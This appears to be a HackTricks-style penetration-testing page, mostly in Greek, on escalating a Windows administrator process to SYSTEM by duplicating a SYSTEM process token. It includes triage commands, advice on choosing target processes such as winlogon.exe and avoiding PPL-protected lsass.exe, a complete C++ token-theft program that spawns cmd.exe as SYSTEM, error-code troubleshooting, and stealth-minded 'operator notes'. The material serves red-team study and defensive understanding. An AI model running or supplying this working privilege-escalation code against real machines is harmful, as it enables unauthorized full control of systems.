# SeImpersonate from High To System

{{#include ../../banners/hacktricks-training.md}}

Αυτή η σελίδα αφορά την **χειροκίνητη** έκδοση της μετάβασης από μια **High Integrity administrator process** σε **`NT AUTHORITY\SYSTEM`** με το **άνοιγμα ενός μη προστατευμένου SYSTEM process, την αντιγραφή του token του και τη δημιουργία ενός child process με αυτό το token**.

Αν έχεις μόνο **`SeImpersonatePrivilege`** / **`SeAssignPrimaryTokenPrivilege`** αλλά **δεν μπορείς να ανοίξεις ένα κατάλληλο SYSTEM process**, η διαδρομή **Potato / named-pipe** είναι συνήθως πιο αξιόπιστη:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

Αν αυτό που θέλεις δεν είναι μόνο `SYSTEM` αλλά ένα **SYSTEM token με όσες περισσότερες privileges γίνεται**, έλεγξε επίσης:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

## Quick triage

Πριν προσπαθήσεις να κλέψεις ένα token, επιβεβαίωσε γρήγορα το context:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege"
```
Practical notes:

- Ένα **High Integrity** admin token είναι συνήθως αρκετό για να **ενεργοποιήσει το `SeDebugPrivilege`** και να ανοίξει πολλά μη προστατευμένα SYSTEM processes.
- Το **`CreateProcessWithTokenW` απαιτεί `SeImpersonatePrivilege`** στον caller. Αν αυτό το API αποτύχει με `1314`, μετάβαλε σε `CreateProcessAsUserW` αφού πρώτα έχεις κάνει duplicate ένα SYSTEM primary token.
- Στα σύγχρονα Windows, το **`lsass.exe` είναι συχνά κακό target** επειδή το **LSA protection / PPL** μπλοκάρει την πρόσβαση ακόμα και για administrators με `SeDebugPrivilege`. Προτίμησε **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`**, ή ένα πρώιμο **`svchost.exe`** που τρέχει ως SYSTEM.
- Όχι κάθε SYSTEM process έχει εξίσου χρήσιμο token. Αν πάρεις SYSTEM αλλά παρατηρήσεις ότι λείπουν privileges, δοκίμασε ένα διαφορετικό SYSTEM process αντί να υποθέσεις ότι η technique είναι σπασμένη.

## Pick the PID carefully

Ο πιο εύκολος τρόπος να το κάνεις να δουλέψει αξιόπιστα είναι να **επιλέξεις ένα SYSTEM process του οποίου το DACL επιτρέπει πραγματικά στους Administrators να κάνουν query το process και να κάνουν duplicate το token του**.

Καλές επιλογές για πρώτο test:

- `winlogon.exe`
- `wininit.exe`
- `services.exe`
- κάποια πρώιμα `svchost.exe` instances που τρέχουν ως SYSTEM

Απόφυγε by default:

- `lsass.exe` σε hosts όπου είναι ενεργό το **RunAsPPL / LSA protection**
- protected / security-sensitive processes που επιστρέφουν `Access denied` ακόμα και μετά την ενεργοποίηση του `SeDebugPrivilege`

Μπορείς να εξετάσεις candidate processes και τα token/ACLs τους με **Process Explorer** ή **Process Hacker** σε elevated mode.

### Code

Ο παρακάτω code είναι από [here](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962). Επιτρέπει να **δώσεις ένα Process ID ως argument** και θα εκτελεστεί ένα CMD **running as the user** του επιλεγμένου process.\
Τρέχοντας σε High Integrity process, μπορείς να **δώσεις το PID ενός process που τρέχει ως System** (όπως `winlogon`, `wininit`) και να εκτελέσεις ένα `cmd.exe` ως SYSTEM.
```cpp
impersonateuser.exe 1234
```

```cpp:impersonateuser.cpp
// From https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962

#include <windows.h>
#include <iostream>
#include <Lmcons.h>
BOOL SetPrivilege(
HANDLE hToken,          // access token handle
LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
BOOL bEnablePrivilege   // to enable or disable privilege
)
{
TOKEN_PRIVILEGES tp;
LUID luid;
if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
lpszPrivilege,   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
if (bEnablePrivilege)
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
else
tp.Privileges[0].Attributes = 0;
// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
return FALSE;
}
if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
{
printf("[-] The token does not have the specified privilege. \n");
return FALSE;
}
return TRUE;
}
std::string get_username()
{
TCHAR username[UNLEN + 1];
DWORD username_len = UNLEN + 1;
GetUserName(username, &username_len);
std::wstring username_w(username);
std::string username_s(username_w.begin(), username_w.end());
return username_s;
}
int main(int argc, char** argv) {
// Print whoami to compare to thread later
printf("[+] Current user is: %s\n", (get_username()).c_str());
// Grab PID from command line argument
char* pid_c = argv[1];
DWORD PID_TO_IMPERSONATE = atoi(pid_c);
// Initialize variables and structures
HANDLE tokenHandle = NULL;
HANDLE duplicateTokenHandle = NULL;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInformation;
ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
startupInfo.cb = sizeof(STARTUPINFO);
// Add SE debug privilege
HANDLE currentTokenHandle = NULL;
BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
{
printf("[+] SeDebugPrivilege enabled!\n");
}
// Call OpenProcess(), print return code and error code
HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
if (GetLastError() == NULL)
printf("[+] OpenProcess() success!\n");
else
{
printf("[-] OpenProcess() Return Code: %i\n", processHandle);
printf("[-] OpenProcess() Error: %i\n", GetLastError());
}
// Call OpenProcessToken(), print return code and error code
BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);
if (GetLastError() == NULL)
printf("[+] OpenProcessToken() success!\n");
else
{
printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
}
// Impersonate user in a thread
BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
if (GetLastError() == NULL)
{
printf("[+] ImpersonatedLoggedOnUser() success!\n");
printf("[+] Current user is: %s\n", (get_username()).c_str());
printf("[+] Reverting thread to original user context\n");
RevertToSelf();
}
else
{
printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
}
// Call DuplicateTokenEx(), print return code and error code
BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
if (GetLastError() == NULL)
printf("[+] DuplicateTokenEx() success!\n");
else
{
printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
}
// Call CreateProcessWithTokenW(), print return code and error code
BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
if (GetLastError() == NULL)
printf("[+] Process spawned!\n");
else
{
printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
}
return 0;
}
```
## Χρήσιμα API / access-right notes

Το sample χρησιμοποιεί `MAXIMUM_ALLOWED`, αλλά για πραγματικές operations είναι χρήσιμο να θυμάσαι τα ελάχιστα pieces που εμπλέκονται:

- Το `OpenProcessToken()` απαιτεί μόνο το **process handle** να έχει ανοίξει με **`PROCESS_QUERY_LIMITED_INFORMATION`**.
- Για να χρησιμοποιήσεις το `CreateProcessWithTokenW()`, το **primary token handle** πρέπει να έχει **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**.
- Το `DuplicateTokenEx()` πρέπει να δημιουργεί ένα **primary token** (`TokenPrimary`), όχι μόνο ένα impersonation token.
- Αν έχεις ήδη impersonated SYSTEM και το `CreateProcessWithTokenW()` εξακολουθεί να αποτυγχάνει με `1314`, δοκίμασε το `CreateProcessAsUserW()` αντί γι' αυτό.

Αυτό σημαίνει ότι το **άνοιγμα του target process με `PROCESS_ALL_ACCESS` είναι συνήθως unnecessary και πιο noisy** από το να ζητάς απλώς τα rights που χρειάζονται για να κάνεις query το token.

## Error

Σε ορισμένες περιπτώσεις μπορεί να προσπαθήσεις να impersonate System και να μην δουλεύει, δείχνοντας output όπως το ακόλουθο:
```cpp
[+] OpenProcess() success!
[+] OpenProcessToken() success!
[-] ImpersonatedLoggedOnUser() Return Code: 1
[-] ImpersonatedLoggedOnUser() Error: 5
[-] DuplicateTokenEx() Return Code: 0
[-] DupicateTokenEx() Error: 5
[-] CreateProcessWithTokenW Return Code: 0
[-] CreateProcessWithTokenW Error: 1326
```
Αυτό σημαίνει ότι ακόμα κι αν τρέχεις σε επίπεδο High Integrity **δεν έχεις αρκετά permissions** πάνω σε εκείνο το target process/token.\
Ας ελέγξουμε τα τρέχοντα Administrator permissions πάνω σε `svchost.exe` processes με **Process Explorer** (ή μπορείς επίσης να χρησιμοποιήσεις **Process Hacker**):

1. Select a process of `svchost.exe`
2. Right Click --> Properties
3. Inside "Security" Tab click in the bottom right the button "Permissions"
4. Click on "Advanced"
5. Select "Administrators" and click on "Edit"
6. Click on "Show advanced permissions"

![Code - Error: 6. Click on "Show advanced permissions"](<../../images/image (437).png>)

Η προηγούμενη εικόνα περιέχει όλα τα privileges που έχουν οι "Administrators" πάνω στο επιλεγμένο process (όπως μπορείς να δεις στην περίπτωση του `svchost.exe` έχουν μόνο "Query" privileges)

Δες τα privileges που έχουν οι "Administrators" πάνω στο `winlogon.exe`:

![Code - Error: See the privileges "Administrators" have over winlogon.exe](<../../images/image (1102).png>)

Μέσα σε εκείνο το process οι "Administrators" μπορούν να "Read Memory" και "Read Permissions", κάτι που πιθανότατα επιτρέπει στους Administrators να impersonate το token που χρησιμοποιεί αυτό το process.

### Common failure causes

- **`OpenProcess()` / `OpenProcessToken()` -> `5 (Access denied)`**: το process DACL σε μπλοκάρει, ή το target είναι **protected/PPL**. Διάλεξε άλλο SYSTEM process.
- **`DuplicateTokenEx()` -> `5 (Access denied)`**: το token handle σου άνοιξε χωρίς αρκετά rights, ή το target token DACL αποτρέπει το duplication.
- **`CreateProcessWithTokenW()` -> `1314`**: ο caller δεν έχει αυτή τη στιγμή ενεργοποιημένο το **`SeImpersonatePrivilege`**. Δοκίμασε να το ενεργοποιήσεις πρώτα ή χρησιμοποίησε `CreateProcessAsUserW()` με το duplicated primary token.
- **`CreateProcessWithTokenW()` -> `1326`** μετά από προηγούμενες αποτυχίες: αυτό συχνά σημαίνει απλώς ότι το προηγούμενο token duplication/impersonation step απέτυχε, άρα δεν υπάρχει usable primary token για να ξεκινήσει το child process.

## Operator notes

- This technique is great when you are already **local admin + high integrity** and just want a quick, manual path to SYSTEM without spinning up a service or a named-pipe coercion chain.
- On hardened Windows 11 / Server environments, **LSA protection is increasingly common**, so a workflow that assumes `lsass.exe` is always readable is brittle. **`winlogon.exe` / `wininit.exe` / `services.exe` are usually better first picks**.
- If you land in a **service account** context instead of an elevated admin desktop, the **Potato family** is usually a better fit than this page.



## References

- [Microsoft: CreateProcessWithTokenW](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [SensePost: Abusing Windows' tokens to compromise Active Directory without touching LSASS](https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/)
{{#include ../../banners/hacktricks-training.md}}
